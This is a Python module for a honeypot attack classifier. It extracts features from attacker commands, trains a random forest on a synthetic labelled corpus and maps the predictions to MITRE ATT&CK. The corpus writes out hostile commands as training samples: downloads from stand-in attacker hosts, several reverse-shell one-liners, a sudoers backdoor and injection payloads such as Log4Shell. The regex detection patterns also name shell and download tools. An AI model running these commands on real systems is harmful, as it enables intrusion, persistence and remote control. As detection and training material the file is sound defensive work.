"""
HoneyTrack Machine Learning Attack Classifier (v1.2)
=====================================================
Supervised machine learning model and feature engineering pipeline
for automated attack categorization, anomaly scoring, and MITRE ATT&CK mapping.
"""

import math
import re
import os
from typing import Dict, Any, List, Tuple, Optional
import numpy as np

# Lazy imports for scikit-learn
_SKLEARN_AVAILABLE = False
try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.preprocessing import StandardScaler
    from sklearn.pipeline import Pipeline
    _SKLEARN_AVAILABLE = True
except ImportError:
    pass

# MITRE ATT&CK Mapping
MITRE_ATTACK_MAPPING = {
    "brute_force": {"id": "T1110", "name": "Brute Force", "tactic": "Credential Access"},
    "credential_spray": {"id": "T1110.003", "name": "Password Spraying", "tactic": "Credential Access"},
    "credential_attempt": {"id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access"},
    "recon": {"id": "T1082", "name": "System Information Discovery", "tactic": "Discovery"},
    "exploit_attempt": {"id": "T1059", "name": "Command and Scripting Interpreter", "tactic": "Execution"},
    "malware_download": {"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control"},
    "privilege_escalation": {"id": "T1548", "name": "Abuse Elevation Control Mechanism", "tactic": "Privilege Escalation"},
    "reverse_shell": {"id": "T1059.004", "name": "Unix Shell / Reverse C2", "tactic": "Execution"},
}

FEATURE_NAMES = [
    "command_length",
    "command_entropy",
    "special_char_count",
    "digit_count",
    "token_count",
    "has_url",
    "has_pipe_or_chain",
    "has_recon_keyword",
    "has_download_tool",
    "has_privesc_keyword",
    "has_revshell_keyword",
    "has_crypto_keyword",
    "attempt_velocity",
    "is_tor",
    "is_ssh",
    "is_http",
    "is_ftp",
    "suspicious_user",
    "password_length"
]


def calculate_entropy(text: str) -> float:
    """Calculates Shannon entropy of input text to detect obfuscation/encoding."""
    if not text:
        return 0.0
    prob_map: Dict[str, int] = {}
    for char in text:
        prob_map[char] = prob_map.get(char, 0) + 1
    length = len(text)
    entropy = 0.0
    for count in prob_map.values():
        p = count / length
        entropy -= p * math.log2(p)
    return float(entropy)


def extract_features(
    service: Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    command: Optional[str] = None,
    attempt_count: int = 1,
    is_tor: bool = False
) -> np.ndarray:
    """
    Extracts a numeric feature vector from attack attributes for ML classification.
    """
    cmd = (command or "").strip()
    cmd_lower = cmd.lower()
    user_lower = (username or "").strip().lower()
    pwd = password or ""
    srv = (service or "").upper()

    cmd_len = float(len(cmd))
    entropy = calculate_entropy(cmd)
    special_chars = len(re.findall(r"[\;\&\|\`\$\(\)\{\}\<\>\\\"\'\!\*]", cmd))
    digits = len(re.findall(r"\d", cmd))
    tokens = len(cmd.split()) if cmd else 0

    has_url = 1.0 if re.search(r"https?://|ftp://|\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", cmd_lower) else 0.0
    has_chain = 1.0 if re.search(r";|&&|\|\||\|", cmd) else 0.0

    recon_patterns = r"\b(whoami|id|uname|hostname|pwd|ls|ifconfig|ip\s+a|netstat|ps\s+|cat\s+/etc/passwd|cat\s+/etc/issue|lscpu)\b"
    has_recon = 1.0 if re.search(recon_patterns, cmd_lower) else 0.0

    download_patterns = r"\b(wget|curl|tftp|ftpget|bitsadmin|certutil|fetch|lynx)\b"
    has_download = 1.0 if re.search(download_patterns, cmd_lower) else 0.0

    privesc_patterns = r"\b(sudo|su\s+|chmod\s+\+?x|chmod\s+777|chown|useradd|crontab|systemctl|iptables)\b"
    has_privesc = 1.0 if re.search(privesc_patterns, cmd_lower) else 0.0

    revshell_patterns = r"\b(nc\s+-e|/bin/sh|/bin/bash|bash\s+-i|/dev/tcp/|pty\.spawn|socat|mkfifo)\b"
    has_revshell = 1.0 if re.search(revshell_patterns, cmd_lower) else 0.0

    crypto_patterns = r"\b(xmrig|minerd|stratum\+tcp|monero|cryptonight|mining)\b"
    has_crypto = 1.0 if re.search(crypto_patterns, cmd_lower) else 0.0

    attempt_velocity = float(math.log1p(max(1, attempt_count)))
    tor_val = 1.0 if is_tor else 0.0

    is_ssh = 1.0 if srv == "SSH" else 0.0
    is_http = 1.0 if srv == "HTTP" else 0.0
    is_ftp = 1.0 if srv == "FTP" else 0.0

    suspicious_users = {"root", "admin", "administrator", "oracle", "postgres", "test", "guest", "ubuntu", "user"}
    is_susp_user = 1.0 if user_lower in suspicious_users else 0.0

    pwd_len = float(len(pwd))

    features = [
        cmd_len,
        entropy,
        float(special_chars),
        float(digits),
        float(tokens),
        has_url,
        has_chain,
        has_recon,
        has_download,
        has_privesc,
        has_revshell,
        has_crypto,
        attempt_velocity,
        tor_val,
        is_ssh,
        is_http,
        is_ftp,
        is_susp_user,
        pwd_len
    ]

    return np.array(features, dtype=np.float32)


# Synthetic training corpus of diverse honeypot adversary techniques
_TRAINING_CORPUS = [
    # (service, username, password, command, attempt_count, is_tor, label)
    # Brute Force
    ("SSH", "root", "123456", None, 12, False, "brute_force"),
    ("SSH", "admin", "password", None, 25, False, "brute_force"),
    ("FTP", "admin", "admin123", None, 8, False, "brute_force"),
    ("HTTP", "admin", "admin", None, 15, True, "brute_force"),
    ("SSH", "root", "toor", None, 6, False, "brute_force"),
    ("SSH", "oracle", "manager", None, 10, False, "brute_force"),
    ("FTP", "ftp", "ftp", None, 7, False, "brute_force"),
    
    # Credential Spray
    ("SSH", "deploy", "Summer2024!", None, 4, False, "credential_spray"),
    ("SSH", "git", "Welcome123", None, 3, False, "credential_spray"),
    ("HTTP", "manager", "Password123", None, 4, True, "credential_spray"),
    ("SSH", "jenkins", "admin2023", None, 3, False, "credential_spray"),

    # Credential Attempt (Isolated)
    ("SSH", "test", "test", None, 1, False, "credential_attempt"),
    ("HTTP", "user", "secret", None, 1, False, "credential_attempt"),
    ("FTP", "anonymous", "anonymous@", None, 1, False, "credential_attempt"),
    ("SSH", "guest", "guest123", None, 2, False, "credential_attempt"),
    ("HTTP", "admin", "hunter2", None, 1, False, "credential_attempt"),

    # Reconnaissance
    ("SSH", "root", "root", "whoami", 1, False, "recon"),
    ("SSH", "root", "root", "uname -a", 1, False, "recon"),
    ("SSH", "root", "root", "id", 1, False, "recon"),
    ("SSH", "root", "root", "cat /etc/passwd", 1, False, "recon"),
    ("SSH", "root", "root", "cat /etc/issue", 1, False, "recon"),
    ("SSH", "root", "root", "hostname", 1, False, "recon"),
    ("SSH", "root", "root", "ip addr", 1, False, "recon"),
    ("SSH", "root", "root", "ifconfig", 1, False, "recon"),
    ("SSH", "root", "root", "ps aux", 1, False, "recon"),
    ("SSH", "root", "root", "netstat -tlnp", 1, False, "recon"),
    ("SSH", "root", "root", "ls -la /", 1, False, "recon"),

    # Malware Download
    ("SSH", "root", "root", "wget http://194.26.29.11/bot.sh -O /tmp/bot.sh", 1, False, "malware_download"),
    ("SSH", "root", "root", "curl -O http://evil-c2.net/payload && chmod +x payload", 1, False, "malware_download"),
    ("SSH", "root", "root", "wget https://pastebin.com/raw/d8a7sd", 1, False, "malware_download"),
    ("SSH", "root", "root", "curl -s http://185.120.30.2/miner.tar.gz | tar xz", 1, True, "malware_download"),
    ("SSH", "root", "root", "certutil -urlcache -split -f http://evil.com/setup.exe", 1, False, "malware_download"),
    ("HTTP", None, None, "/download?file=http://malicious.ru/trojan.elf", 1, False, "malware_download"),

    # Privilege Escalation
    ("SSH", "root", "root", "sudo -l", 1, False, "privilege_escalation"),
    ("SSH", "root", "root", "chmod +x /tmp/payload", 1, False, "privilege_escalation"),
    ("SSH", "root", "root", "chmod 777 /etc/cron.d/job", 1, False, "privilege_escalation"),
    ("SSH", "root", "root", "useradd -m -s /bin/bash hacker && echo 'hacker:pwn' | chpasswd", 1, False, "privilege_escalation"),
    ("SSH", "root", "root", "echo 'root ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", 1, False, "privilege_escalation"),

    # Reverse Shell
    ("SSH", "root", "root", "nc -e /bin/sh 10.0.0.1 4444", 1, False, "reverse_shell"),
    ("SSH", "root", "root", "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1", 1, False, "reverse_shell"),
    ("SSH", "root", "root", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", 1, False, "reverse_shell"),
    ("SSH", "root", "root", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f", 1, False, "reverse_shell"),

    # Exploit Attempt
    ("HTTP", "admin", None, "/cgi-bin/test-cgi?|whoami", 1, False, "exploit_attempt"),
    ("HTTP", "admin", None, "' OR '1'='1' --", 1, False, "exploit_attempt"),
    ("HTTP", None, None, "/actuator/gateway/routes", 1, False, "exploit_attempt"),
    ("HTTP", None, None, "/..%2f..%2f..%2fetc/passwd", 1, False, "exploit_attempt"),
    ("HTTP", None, None, "/?q=${jndi:ldap://evil.com/a}", 1, False, "exploit_attempt"),
    ("SSH", "root", "root", "cat <(echo 'injection')", 1, False, "exploit_attempt"),
]


class MLAttackClassifier:
    """
    Random Forest Machine Learning model for intelligent honeypot attack classification.
    """

    def __init__(self):
        self.pipeline = None
        self.classes = []
        self._is_trained = False
        if _SKLEARN_AVAILABLE:
            self._train_model()

    def _train_model(self):
        """Trains the Random Forest model on the cyber threat corpus."""
        try:
            X_data = []
            y_data = []
            for item in _TRAINING_CORPUS:
                srv, user, pwd, cmd, att, tor, label = item
                feat = extract_features(
                    service=srv,
                    username=user,
                    password=pwd,
                    command=cmd,
                    attempt_count=att,
                    is_tor=tor
                )
                X_data.append(feat)
                y_data.append(label)

            X = np.array(X_data, dtype=np.float32)
            y = np.array(y_data)

            self.classes = sorted(list(set(y_data)))

            # Lightweight, deterministic Random Forest pipeline
            self.pipeline = Pipeline([
                ("scaler", StandardScaler()),
                ("clf", RandomForestClassifier(
                    n_estimators=60,
                    max_depth=10,
                    random_state=42,
                    n_jobs=1
                ))
            ])
            self.pipeline.fit(X, y)
            self._is_trained = True
        except Exception as e:
            self._is_trained = False

    def predict(
        self,
        service: Optional[str] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
        command: Optional[str] = None,
        attempt_count: int = 1,
        is_tor: bool = False
    ) -> Dict[str, Any]:
        """
        Classifies an attack event using the trained ML model.
        Falls back to rule-based heuristics if scikit-learn is unavailable.
        """
        features = extract_features(
            service=service,
            username=username,
            password=password,
            command=command,
            attempt_count=attempt_count,
            is_tor=is_tor
        )

        if self._is_trained and self.pipeline is not None:
            try:
                X = features.reshape(1, -1)
                pred_label = self.pipeline.predict(X)[0]
                proba_arr = self.pipeline.predict_proba(X)[0]
                
                classes_list = list(self.pipeline.classes_)
                max_idx = np.argmax(proba_arr)
                confidence = float(proba_arr[max_idx])
                
                # Heuristic override for high-velocity brute force or obvious revshells
                if attempt_count >= 5 and pred_label not in ("malware_download", "reverse_shell"):
                    pred_label = "brute_force"
                    confidence = max(confidence, 0.95)
                elif command and ("nc -e" in command or "/dev/tcp" in command):
                    pred_label = "reverse_shell"
                    confidence = 0.99

                mitre_info = MITRE_ATTACK_MAPPING.get(pred_label, {
                    "id": "T1059",
                    "name": "Command Execution",
                    "tactic": "Execution"
                })

                # Anomaly score based on entropy, command complexity, and TOR
                entropy = float(features[1])
                anomaly_score = min(100, int((entropy * 12) + (features[2] * 4) + (25 if is_tor else 0) + min(30, attempt_count * 2)))

                return {
                    "attack_type": str(pred_label),
                    "confidence": round(confidence, 3),
                    "model": "RandomForest_v1.2",
                    "anomaly_score": anomaly_score,
                    "mitre_id": mitre_info["id"],
                    "mitre_name": mitre_info["name"],
                    "mitre_tactic": mitre_info["tactic"]
                }
            except Exception:
                pass

        # Rule-based fallback
        from analysis.classifier import classify_attack
        fallback_type = classify_attack(
            service=service,
            username=username,
            password=password,
            command=command,
            attempt_count=attempt_count
        )
        mitre_info = MITRE_ATTACK_MAPPING.get(fallback_type, {
            "id": "T1078",
            "name": "Valid Accounts",
            "tactic": "Initial Access"
        })

        return {
            "attack_type": fallback_type,
            "confidence": 0.85,
            "model": "RuleEngine_Fallback",
            "anomaly_score": 40 if not is_tor else 70,
            "mitre_id": mitre_info["id"],
            "mitre_name": mitre_info["name"],
            "mitre_tactic": mitre_info["tactic"]
        }


# Global singleton instance
ml_classifier = MLAttackClassifier()


def classify_attack_ml(
    service: Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    command: Optional[str] = None,
    attempt_count: int = 1,
    is_tor: bool = False
) -> Dict[str, Any]:
    """Convenience functional wrapper for ML attack classification."""
    return ml_classifier.predict(
        service=service,
        username=username,
        password=password,
        command=command,
        attempt_count=attempt_count,
        is_tor=is_tor
    )
